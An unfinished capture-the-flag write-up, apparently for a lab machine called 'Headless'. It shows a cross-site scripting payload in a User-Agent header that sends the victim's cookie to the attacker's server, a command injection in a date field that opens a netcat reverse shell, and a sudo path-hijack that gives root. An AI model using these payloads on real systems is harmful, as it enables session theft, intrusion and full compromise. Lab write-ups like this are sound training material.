*Not finished*

We run nmap and find that port 5000 is open.

There is a support screen where there is a place to log a support ticket. We input a script there to check for a cross site scripting vulnerability. This is input in burpsuite

```
User-Agent: <script>var i=new Image(); i.src="http://10.10.14.41:5000/?cookie="+btoa(document.cookie);
</script>
```

On our local we run a webserver to to receive a cookie:

```
python3 -m http.server 5000

Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
10.10.14.41 - - [14/Jul/2024 11:08:21] "GET /?
cookie=aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz HTTP/1.1" 200 -
10.10.11.8 - - [14/Jul/2024 11:08:42] "GET /?
cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```

After a gobuster dir attack, we see that there is a /dashboard behind a signin. We use the cookie to login as admin to connect to the /dashboard. First we have to run the cookie against base64

```
echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
```

We then input the cookie via developer tools in the storage tab.

On the /dashboard page in burpsuite we find that there is a `date` input, we add another command injection there to get a reverse shell on the attacking box.

```
date=2023-09-15;+nc+10.10.14.41+4444+-e+/bin/bash
```

Netcat listens and gets our shell:

```
$ nc -lnvp 4444

id 
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
```

I have obtained interactive shell as the `dvir` user. I can upgrade the shell with 

```
script /dev/null -c /bin/bash

Script started, output log file is '/dev/null'.
dvir@headless:~/app$
```

The user flag is found by running `cat /home/dvir/user.txt`

To get root access I run `sudo -l` to see what this user can run as root. The output is the file `/usr/bin/syscheck`.

Looking at the file, it does a database service check, where if there is no process named `initdb.sh` running, the script attempts to execute it without specifying an absolute path. Since I have permissions in certain directories, I can create a malicious script named `initdb.sh`, when the script runs it will run with root privileges.

I create the file `initdb.sh` in the `/tmp` folder:

```
dvir@headless:/tmp$ cd /tmp
dvir@headless:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > /tmp/initdb.sh
dvir@headless:/tmp$ chmod +x /tmp/initdb.sh

dvir@headless:/tmp$ sudo /usr/bin/syscheck

Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.05, 0.03, 0.00
Database service is not running. Starting it...
id

uid=0(root) gid=0(root) groups=0(root)
```

Now that we have root access I can `cat /root/roo.txt` and get the flag.